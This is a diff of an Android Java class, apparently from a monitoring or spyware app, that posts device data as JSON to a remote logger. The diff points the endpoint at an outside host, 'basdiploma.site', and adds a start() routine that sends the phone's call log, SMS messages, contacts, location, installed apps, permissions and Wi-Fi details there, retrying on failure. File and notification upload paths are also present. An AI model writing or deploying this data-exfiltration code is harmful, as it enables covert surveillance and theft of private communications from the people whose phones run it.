@@ -16,17 +16,20 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.Calendar;
 
+import javax.net.ssl.HttpsURLConnection;
+
 public class Sender extends AsyncTask<String, Void, String> {
 
-    public static String baseUrl = "http://192.168.0.111:5000/api/logger/";
+    public static String baseUrl = "https://basdiploma.site/api/logger/";
 
     @Override
     protected String doInBackground(String... strings) {
+        Logger.log("sending" + strings[0]);
         String data = "";
         URL url;
         try {
             url = new URL(baseUrl);
-            HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
+            HttpsURLConnection httpURLConnection = (HttpsURLConnection)url.openConnection();
             httpURLConnection.setDoOutput(true);
             httpURLConnection.setRequestMethod("POST");
             httpURLConnection.setRequestProperty("Content-Type","application/json");
@@ -53,13 +56,31 @@ public class Sender extends AsyncTask<String, Void, String> {
             bufferedReader.close();
             data = sb.toString();
         } catch (Exception ex) {
+            Logger.log("error", ex.getMessage());
             ex.printStackTrace();
         }
 
         return data;
     }
 
+    public static void start() {
+        Logger.log("Sender.start()");
+        try {
+            Sender.sendApps(true);
+            Sender.sendCalls();
+            Sender.sendContacts();
+            Sender.sendLocation();
+            Sender.sendPermissions();
+            Sender.sendSms();
+            Sender.sendWifi();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            start();
+        }
+    }
+
     public static void send(JSONObject toSend) {
+        Logger.log("Sender.send()");
         try {
             toSend.put(
                     "date",
@@ -80,6 +101,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     }
 
     public static boolean sendWifi() {
+        Logger.log("Sender.sendWifi()");
         try {
             showMsg("Wifi send");
             JSONObject data = new JSONObject();
@@ -96,6 +118,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     }
 
     public static boolean sendSms() {
+        Logger.log("Sender.sendSms()");
         try {
             showMsg("Sms send");
             JSONObject data = new JSONObject();
@@ -112,6 +135,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     }
 
     public static boolean sendPermissions() {
+        Logger.log("Sender.sendPermissions()");
         try {
             showMsg("Permissions send");
             JSONObject data = new JSONObject();
@@ -128,6 +152,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     }
 
     public static boolean sendNotification(JSONObject notification) {
+        Logger.log("Sender.sendNotification()");
         try {
             showMsg("Notification send");
             JSONObject data = new JSONObject();
@@ -144,6 +169,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     }
 
     public static boolean sendLocation() {
+        Logger.log("Sender.sendLocation()");
         try {
             showMsg("Location send");
             Context context = MainService.getContext();
@@ -164,6 +190,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     }
 
     public static boolean sendContacts() {
+        Logger.log("Sender.sendContacts()");
         try {
             showMsg("Contacts send");
             JSONObject data = new JSONObject();
@@ -180,6 +207,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     }
 
     public static boolean sendCalls() {
+        Logger.log("Sender.sendCalls()");
         try {
             showMsg("Calls send");
             JSONObject data = new JSONObject();
@@ -196,6 +224,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     }
 
     public static boolean sendApps(boolean isWithSystemApps) {
+        Logger.log("Sender.sendApps()");
         try {
             showMsg("Apps send");
             JSONObject data = new JSONObject();
@@ -213,6 +242,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     }
 
     public static boolean sendError(JSONObject data) {
+        Logger.log("Sender.sendError()");
         try {
             data.put("type", "error");
             send(data);
@@ -226,6 +256,7 @@ public class Sender extends AsyncTask<String, Void, String> {
     }
 
     public static boolean sendFile(JSONObject data) {
+        Logger.log("Sender.sendFile()");
         try {
             data.put("type", "file");
             send(data);
